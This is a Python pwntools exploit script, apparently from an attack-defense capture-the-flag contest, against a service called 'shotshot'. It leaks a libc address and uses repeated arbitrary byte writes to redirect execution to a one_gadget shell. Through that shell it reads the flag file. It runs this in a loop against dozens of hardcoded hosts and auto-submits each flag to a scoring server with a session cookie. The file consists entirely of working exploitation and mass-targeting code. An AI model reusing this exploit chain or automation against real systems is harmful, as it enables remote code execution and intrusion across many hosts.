# coding=utf-8
from pwn import *
import requests

def pwn(ip,port):
	gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
	debug=0
	try:
		if debug:
			timeout=0
			p = process('./shotshot')
			libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
			context.log_level='debug'
		else:
			timeout=5
			p=remote(ip,port,timeout)
			libc=ELF('./libc.so.6')
			


		def select_shot(idx):
			p.recvuntil('exit')
			p.sendline('4')	
			p.recvuntil('3. C++')
			p.sendline(str(idx))
		def write_one(where,value):
			select_shot(1)
			p.recvuntil('id:')
			p.sendline(str(where))
			select_shot(0)
			select_shot(0)
			select_shot(0)
			p.recvuntil('luckynum:')
			p.sendline(str(value))


		p.recvuntil('Your name :')
		p.send('a'*0x20)
		p.recvuntil('Thank you ')
		p.recvuntil('a'*0x20)
		libc_addr = u64(p.recv(6).ljust(8,'\0'))-0x3c5540
		if ((libc_addr&0xfff)!=0):
			print 'libc leak errer!!'
			exit(0)
		print '[+] libc',hex(libc_addr)
		print '[+] gusee',hex(libc_addr +0x5ee000)
		
		maybe = ((libc_addr +0x5ee000)>>8)&0xff
		if (maybe<0x70):
			print 'bad luck'
			exit(0)

		#leak here
		p.recvuntil('exit')
		p.sendline('1')
		p.recvuntil('name:')
		p.sendline(str(0x100))
		p.recvuntil('name:')
		p.sendline('/bin/sh\0')

		one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
		target = libc_addr + one_gadget[0]

		#gdb.attach(p,'b *0x4009c8')
		for i in range(6):
			where = 0x1000*i+0x1020+i
			value = (target >> (i*8))&0xff
			write_one(where,value)
		#z('b *0x400A00\nc')	
		write_one(0x1000*i+0x2000+1,maybe)

		p.sendline("echo 'aaa';cat flag;echo 'bbb'")
		p.recvuntil('aaa',timeout)
		flag = p.recvuntil('bbb',timeout)[:-3]
		print flag
		
		p.close()
		return flag.replace('\n','')
	except:
		return ''
def submit(flag):
	# send post requests
	cookie = {"JSESSIONID": "62BECA3DF4C92956C87EC6361248A436"}
	header = {"Referer": "http://172.91.1.12:9090/arace/index"}
	s = requests.session()
	r = s.post("http://172.91.1.12:9090/ad/hacker/submit/submitCode", data={"flag": flag}, cookies=cookie, headers=header)
	return r.text

if __name__ == '__main__':
	flag=""
	#print "hello"
	banlist=[]
	
	ips = ['172.91.0.101', '172.91.0.104', '172.91.0.106', '172.91.0.112',' 172.91.0.115', '172.91.0.116', '172.91.0.122', '172.91.0.125',  '172.91.0.138', '172.91.0.144', '172.91.0.18', '172.91.0.33', '172.91.0.34', '172.91.0.35', '172.91.0.42', '172.91.0.44', '172.91.0.45', '172.91.0.47 ','172.91.0.51', '172.91.0.53', '172.91.0.54', '172.91.0.59','172.91.0.60', '172.91.0.61', '172.91.0.62', '172.91.0.64', '172.91.0.68', '172.91.0.69', '172.91.0.70', '172.91.0.78', '172.91.0.82', '172.91.0.87', '172.91.0.88', '172.91.0.91', '172.91.0.92', '172.91.0.93', '172.91.0.94', '172.91.0.97', '172.91.0.99']
	for i in range(len(ips)):
		ip = ips[i]
		port = 8084
		print ip,port
		flag = pwn(ip,port)
		#flag = "b6d30e1802de8492c0657ee7d34fa82e9e21b0a118a40b4bbed2662421c88c61"
		if flag:
			print submit(flag)


